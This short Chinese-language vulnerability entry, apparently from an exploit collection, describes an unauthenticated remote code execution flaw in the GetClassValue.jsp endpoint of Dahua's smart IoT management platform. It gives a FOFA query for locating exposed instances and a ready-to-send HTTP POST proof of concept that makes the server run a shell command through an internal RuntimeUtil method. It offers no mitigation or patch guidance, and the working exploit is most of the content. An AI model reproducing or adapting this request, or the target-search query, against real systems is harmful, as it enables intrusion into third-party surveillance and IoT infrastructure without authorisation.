# 大华智能物联综合管理平台GetClassValue.jsp远程代码执行漏洞

大华智能物联综合管理平台GetClassValue.jsp远程代码执行漏洞，攻击者可以不需要授权远程执行命令。

## fofa

```javascript
app="dahua-智能物联综合管理平台"
```

## poc

```javascript
POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
Host: 
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

{
    "data": {
        "clazzName": "com.dahua.admin.util.RuntimeUtil",
        "methodName": "syncexecReturnInputStream",
        "fieldName": ["id"]
    }
}
```

![image-20250102172533617](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501021725804.png)